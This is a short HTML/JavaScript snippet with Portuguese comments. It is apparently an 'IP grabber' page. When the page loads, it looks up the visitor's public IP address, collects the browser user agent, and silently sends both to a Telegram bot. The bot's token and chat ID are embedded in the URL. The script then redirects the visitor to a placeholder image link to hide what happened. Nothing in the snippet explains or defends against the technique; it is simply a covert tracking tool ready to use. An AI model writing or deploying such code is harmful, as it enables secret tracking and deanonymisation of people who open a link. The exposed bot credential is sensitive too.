<script>
  // Pega o IP primeiro
  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const msg = "WORM WEB LOG\nIP: " + data.ip + "\nUA: " + navigator.userAgent;
      const url = "https://api.telegram.org/bot8536635132:AAEgtLwL1QQIe0g1VolOW6ts510DtscfKv4/sendMessage?chat_id=8053770740&text=" + encodeURIComponent(msg);
      
      // O Beacon garante o envio mesmo no redirecionamento
      navigator.sendBeacon(url);
      
      // Espera um pouco para garantir e joga para a imagem
      setTimeout(() => {
        window.location.href = "LINK_DA_SUA_IMAGEM_AQUI";
      }, 700);
    }).catch(() => {
      window.location.href = "LINK_DA_SUA_IMAGEM_AQUI";
    });
</script>
